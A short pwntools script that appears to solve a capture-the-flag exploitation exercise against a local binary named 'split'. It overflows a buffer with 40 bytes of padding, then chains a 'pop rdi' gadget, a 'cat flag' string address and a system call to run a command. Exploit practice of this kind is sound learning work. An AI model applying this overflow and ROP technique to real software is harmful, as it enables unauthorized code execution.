from pwn import *

r = process('./split')

cat_flag = 0x00601060
call_sys = 0x00400810
pop_rdi  = 0x0000000000400883 # pop rdi ; ret

p = 'a' * 40
p += p64(pop_rdi)
p += p64(cat_flag)
p += p64(call_sys)
r.send(p)

r.interactive()
